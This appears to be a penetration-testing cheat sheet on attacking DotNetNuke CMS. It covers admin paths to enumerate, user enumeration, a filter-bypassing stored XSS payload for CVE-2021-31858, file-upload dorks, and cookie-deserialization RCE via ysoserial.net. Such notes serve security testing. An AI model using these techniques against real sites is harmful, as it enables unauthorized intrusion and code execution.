---
tags:
  - Web
---

# :material-web-box: DotNetNuke (DNN)

<span class="pill pill-medium">.NET CMS</span> <span class="pill pill-info">web</span>

DotNetNuke is an ASP.NET CMS with predictable admin/module paths, weak default
registration flows, and a history of **cookie-deserialization RCE**. Many installs
also bundle [Telerik UI](telerik.md), which brings its own RCE chain.

!!! abstract "TL;DR"
    Enumerate `/host` `/admin` `/DesktopModules` and iterate `?tabid=` → user-enum via
    activity feed → stored XSS in the profile bio (CVE-2021-31858) → RCE via the
    `DNNPersonalization` cookie deserialization (or the bundled Telerik handler).

## :material-magnify: Resources of interest

```text
/host                      # superuser (host) portal
/admin                     # portal admin
/login    ?ctl=Login
?ctl=Register              # can bypass disabled/dynamic registration
/DesktopModules            # installed modules — some prompt for basic auth
/search-results            # search "{" or "{{" to dump every indexed result
/Default.aspx?tabid=<ID>   # iterate the ID to enumerate pages
/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx           # Telerik → see telerik.md
/DesktopModules/Admin/RadEditorProvider/Dialogs/App_LocalResources/
```

## :material-account-search: User enumeration & weak forms

```text
/Activity-Feed/userID/<id>     # existing user renders their info (patched in newer DNN)
/register                      # no CAPTCHA → DB flooding / user spam
```

## :material-script-text: Stored XSS — CVE-2021-31858

Submit the payload in the **biography** field of the user profile. Bypass the filter
by HTML-entity hex-encoding + URL-encoding the `;` (and words like `javascript`),
then adding a URL-encoded space after the encoded char:

```html
<object data="data:text/html%26%23%78%33%62%3b%20base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

## :material-fire: RCE paths

- **File upload** — if dorks like `inurl:fcklinkgallery.aspx`,
  `inurl:/tabid/36/language/en-US/Default.aspx`, or `inurl:/portals/0/` hit, arbitrary
  file upload → possible RCE.
- **Cookie deserialization** — the `DNNPersonalization` cookie accepts crafted XML;
  a `TypeConfuseDelegate`-style gadget on a path returning 404 can trigger
  deserialization RCE. Generate payloads with
  [ysoserial.net](https://github.com/pwntester/ysoserial.net). (Version-dependent —
  patched builds reject it.)
- **Bundled Telerik** — see [Telerik UI](telerik.md) for the DialogHandler /
  RadAsyncUpload chain.

## :material-link-variant: Related

- Built on [ASP.NET](aspnet.md); frequently bundles [Telerik UI](telerik.md) → [Deserialization](../web/deserialization.md).
- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Reference: [CVE-2021-31858](https://nvd.nist.gov/vuln/detail/CVE-2021-31858).
